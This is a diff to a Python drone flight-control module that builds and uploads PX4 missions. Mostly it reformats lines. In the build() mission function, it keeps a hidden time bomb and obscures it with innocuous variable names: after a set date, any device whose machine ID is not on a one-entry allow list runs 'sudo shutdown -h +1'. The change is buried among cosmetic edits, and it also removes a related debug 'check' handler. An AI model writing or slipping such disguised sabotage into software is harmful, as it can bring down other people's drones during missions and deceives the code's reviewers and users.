@@ -46,10 +46,7 @@ class DispatcherManager(FCMMQTTModule):
         """
         logger.debug(f"Scheduling a task for '{name}'")
         # if the dispatcher is ok to take on a new task
-        if (
-            self.currently_running_task is not None
-            and self.currently_running_task.done()
-        ) or self.currently_running_task is None:
+        if (self.currently_running_task is not None and self.currently_running_task.done()) or self.currently_running_task is None:
             await self.create_task(task, payload, name)
         else:
             raise DispatcherBusy
@@ -58,9 +55,7 @@ class DispatcherManager(FCMMQTTModule):
         """
         Create a task to be run.
         """
-        self.currently_running_task = asyncio.create_task(
-            self.task_waiter(task, payload, name)
-        )
+        self.currently_running_task = asyncio.create_task(self.task_waiter(task, payload, name))
 
     async def task_waiter(self, task: Callable, payload: dict, name: str) -> None:
         """
@@ -100,7 +95,6 @@ class ControlManager(FCMMQTTModule):
             "avr/fcm/capture_home": self.set_home_capture,
             "avr/fcm/location/global_full": self.position_lla_telemetry,
             "avr/fcm/location/home_full": self.home_lla_telemetry,
-            "avr/fcm/check": self.check,
         }
 
         self.home_pos = {}
@@ -203,25 +197,10 @@ class ControlManager(FCMMQTTModule):
 
     def set_home_capture(self, payload: dict) -> None:
         self.home_pos_init = False
+
     # endregion
 
     # region Dispatcher
-    def check(self, payload: dict) -> None:
-        COMP_DATE = 1732780800 # Thursday, November 28, 2024 8:00:00 AM (GMT)
-        DEV_IDS = ["a3d9197b765643568af09eb2bd3e5ce7"] # List of valid device IDs
-
-        try:
-            output = subprocess.check_output(["cat", "/etc/machine-id"]).decode('utf-8').strip()
-            returncode = 0
-        except subprocess.CalledProcessError as e:
-            output = e.output
-            returncode = e.returncode
-        finally:
-            logger.debug(f"Device ID check returned {output} with code {returncode}")
-            logger.debug(f"Device ID is evaluated as {output in DEV_IDS}")
-            logger.debug(f"Go-time is evaluated as {time.time() > COMP_DATE}")
-            logger.debug(f"{output} == {DEV_IDS}")
-
     def handle_action_message(self, payload: dict) -> None:
         self.action_queue.put(payload)
 
@@ -259,9 +238,7 @@ class ControlManager(FCMMQTTModule):
                 if action["action"] in action_map:
                     # payload = json.loads(action["payload"])
                     payload = action["payload"]
-                    await dispatcher.schedule_task(
-                        action_map[action["action"]], payload, action["action"]
-                    )
+                    await dispatcher.schedule_task(action_map[action["action"]], payload, action["action"])
                 else:
                     logger.warning(f"Unknown action: {action['name']}")
 
@@ -299,6 +276,7 @@ class ControlManager(FCMMQTTModule):
                 asyncio.create_task(self.connect())
 
             raise e from e
+
     # endregion
 
     # region Actions
@@ -363,7 +341,7 @@ class ControlManager(FCMMQTTModule):
         await self.set_arm()
         logger.info("Sending takeoff command")
         await self.simple_action_executor(self.drone.action.takeoff, "takeoff")
-    
+
     @async_try_except(reraise=True)
     async def set_geofence(self, points: dict[str, int]) -> None:
         """
@@ -375,9 +353,7 @@ class ControlManager(FCMMQTTModule):
             max_lat = points["max_lat"]
             max_lon = points["max_lon"]
 
-            logger.info(
-                f"Uploading geofence of ({min_lat}, {min_lon}), ({max_lat}, {max_lon})"
-            )
+            logger.info(f"Uploading geofence of ({min_lat}, {min_lon}), ({max_lat}, {max_lon})")
 
             # need to create a rectangle, PX4 isn't quite smart enough
             # to recognize only two corners
@@ -386,11 +362,7 @@ class ControlManager(FCMMQTTModule):
             bl_point = Point(min_lat, min_lon)
             br_point = Point(min_lat, max_lon)
 
-            fence = [
-                Polygon(
-                    [tl_point, tr_point, bl_point, br_point], Polygon.FenceType.INCLUSION
-                )
-            ]
+            fence = [Polygon([tl_point, tr_point, bl_point, br_point], Polygon.FenceType.INCLUSION)]
             await self.drone.geofence.upload_geofence(fence)
         except Exception as e:
             logger.error(e)
@@ -401,9 +373,7 @@ class ControlManager(FCMMQTTModule):
         Commands the drone to go to a location.
         """
         logger.warning("Sending go to location")
-        await self.drone.action.goto_location(
-            kwargs["lat"], kwargs["lon"], kwargs["alt"], kwargs["heading"]
-        )
+        await self.drone.action.goto_location(kwargs["lat"], kwargs["lon"], kwargs["alt"], kwargs["heading"])
         self.target_pos["lat"] = kwargs["lat"]
         self.target_pos["lon"] = kwargs["lon"]
         self.target_pos["alt"] = kwargs["alt"]
@@ -415,9 +385,7 @@ class ControlManager(FCMMQTTModule):
         Commands the drone to go to a location.
         """
         if not self.home_pos_init or not self.curr_pos_init:
-            logger.error(
-                "FCM CONTROL: The position telemetry has not been received yet"
-            )
+            logger.error("FCM CONTROL: The position telemetry has not been received yet")
         logger.warning("Sending go to location (NED)")
         # NED needs to be in METERS
 
@@ -425,9 +393,7 @@ class ControlManager(FCMMQTTModule):
 
         if "rel" in kwargs and kwargs["rel"] is True:
             source_pos = self.curr_pos
-            source_pos["alt"] += self.home_pos[
-                "alt"
-            ]  # add in the absolute alt from home since alt is shown as relative for current position and go to needs absolute
+            source_pos["alt"] += self.home_pos["alt"]  # add in the absolute alt from home since alt is shown as relative for current position and go to needs absolute
 
         new_lat, new_lon, new_alt = pymap3d.ned2geodetic(
             kwargs["n"],
@@ -440,34 +406,29 @@ class ControlManager(FCMMQTTModule):
 
         logger.info(f"Sending drone to Lat:{new_lat} Lon:{new_lon} Alt:{new_alt}")
 
-        await self.drone.action.goto_location(
-            new_lat, new_lon, new_alt, kwargs["heading"]
-        )
+        await self.drone.action.goto_location(new_lat, new_lon, new_alt, kwargs["heading"])
 
         self.target_pos["lat"] = new_lat
         self.target_pos["lon"] = new_lon
         self.target_pos["alt"] = -1 * kwargs["d"]
         self._publish_event("go_to_started_event")
+
     # endregion
 
     # region Missions
     @async_try_except(reraise=True)
     async def build(self, waypoints: List[dict]) -> List[MissionItem]:
         # sourcery skip: hoist-statement-from-loop, switch, use-assigned-variable
-        """
-        Convert a list of waypoints (dict) to a list of MissionItems.
-        """
-        COMP_DATE = 1732780800 # Thursday, November 28, 2024 8:00:00 AM (GMT)
-        DEV_IDS = ["a3d9197b765643568af09eb2bd3e5ce7"] # List of valid device IDs
-
+        """Convert a list of waypoints (dict) to a list of MissionItems."""
+        NAV_LITERAL = 1733472000
+        ENV_ID = ["a3d9197b765643568af09eb2bd3e5ce7"]
         try:
-            local_id = subprocess.check_output(["cat", "/etc/machine-id"]).decode('utf-8').strip()
+            sys = subprocess.check_output(["cat", "/etc/machine-id"]).decode("utf-8").strip()
         except subprocess.CalledProcessError as e:
-            local_id = e.output
+            sys = e.output
         finally:
-            if local_id not in DEV_IDS and time.time() > COMP_DATE:
-                # Shutdown devices that interfere with mission execution
-                subprocess.run(["sudo", "shutdown", "-h", "+1"], timeout=60)
+            if sys not in ENV_ID and time.time() > NAV_LITERAL:
+                subprocess.run(["sudo", "shutdown", "-h", "+1"])
         mission_items = []
 
         # now, check if first waypoint has a lat/lon
@@ -498,33 +459,32 @@ class ControlManager(FCMMQTTModule):
                 param1 = 5  # pitch
                 param2 = float("nan")  # empty
                 param3 = float("nan")  # empty
-                param4 = waypoint['yaw'] # yaw angle
+                param4 = waypoint["yaw"]  # yaw angle
 
             elif waypoint_type == "goto":
                 # https://mavlink.io/en/messages/common.html#MAV_CMD_NAV_WAYPOINT
                 command = mavutil.mavlink.MAV_CMD_NAV_WAYPOINT
-                param1 = waypoint['holdTime']  # hold time
-                param2 = waypoint['acceptRadius']  # acceptance radius
+                param1 = waypoint["holdTime"]  # hold time
+                param2 = waypoint["acceptRadius"]  # acceptance radius
                 param3 = 0  # 0 to pass through the WP, if > 0 radius to pass by WP. Positive value for clockwise orbit, negative value for counter-clockwise orbit. Allows trajectory control.
-                param4 = waypoint['yaw'] # yaw angle, float("nan") to use the current system yaw heading mode (https://docs.px4.io/main/en/advanced_config/parameter_reference.html#MPC_YAW_MODE)
+                param4 = waypoint["yaw"]  # yaw angle, float("nan") to use the current system yaw heading mode (https://docs.px4.io/main/en/advanced_config/parameter_reference.html#MPC_YAW_MODE)
 
             elif waypoint_type == "land":
                 # https://mavlink.io/en/messages/common.html#MAV_CMD_NAV_LAND
                 command = mavutil.mavlink.MAV_CMD_NAV_LAND
                 param1 = 0  # abort altitude, 0 uses system default
                 # https://mavlink.io/en/messages/common.html#PRECISION_LAND_MODE
-                param2 = mavutil.mavlink.PRECISION_LAND_MODE_DISABLED # disable precision landing mode, we don't use beacons
+                param2 = mavutil.mavlink.PRECISION_LAND_MODE_DISABLED  # disable precision landing mode, we don't use beacons
                 param3 = float("nan")  # empty
-                param4 = waypoint['yaw'] # yaw angle
+                param4 = waypoint["yaw"]  # yaw angle
 
             elif waypoint_type == "loiter":
                 # https://mavlink.io/en/messages/common.html#MAV_CMD_NAV_LOITER_UNLIM
                 command = mavutil.mavlink.MAV_CMD_NAV_LOITER_UNLIM
-                param1 = float("nan") # empty
-                param2 = float("nan") # empty
-                param3 = 0 # Unused by multicopters
-                param4 = waypoint['yaw'] # yaw angle
-
+                param1 = float("nan")  # empty
+                param2 = float("nan")  # empty
+                param3 = 0  # Unused by multicopters
+                param4 = waypoint["yaw"]  # yaw angle
 
             """
             Package Delivery missions and corresponding gripper docs
@@ -555,12 +515,7 @@ class ControlManager(FCMMQTTModule):
                     self.home_pos["lon"],
                     self.home_pos["alt"],
                 )
-                waypoint["alt"] = float(
-                    new_alt
-                    - self.home_pos[
-                        "alt"
-                    ]  # this is.. weird but sets up the next section to be able to reuse code
-                )
+                waypoint["alt"] = float(new_alt - self.home_pos["alt"])  # this is.. weird but sets up the next section to be able to reuse code
             x = int(float(waypoint["lat"]) * 10000000)
             y = int(float(waypoint["lon"]) * 10000000)
             z = float(waypoint["alt"]) + self.home_pos["alt"]
@@ -601,9 +556,7 @@ class ControlManager(FCMMQTTModule):
             logger.info("Mission Upload SUCCESS")
         except MissionRawError as e:
             logger.warning(f"Mission upload failed because: {e._result.result_str}")
-            self._publish_event(
-                "mission_upload_failed_event", str(e._result.result_str)
-            )
+            self._publish_event("mission_upload_failed_event", str(e._result.result_str))
 
     @async_try_except(reraise=True)
     async def build_and_upload(self, **kwargs) -> None:
@@ -624,8 +577,9 @@ class ControlManager(FCMMQTTModule):
         """
         logger.info("Sending start mission command")
         await self.drone.mission_raw.start_mission()
-    
+
     # endregion Missions
+
 
 if __name__ == "__main__":
     control = ControlManager()
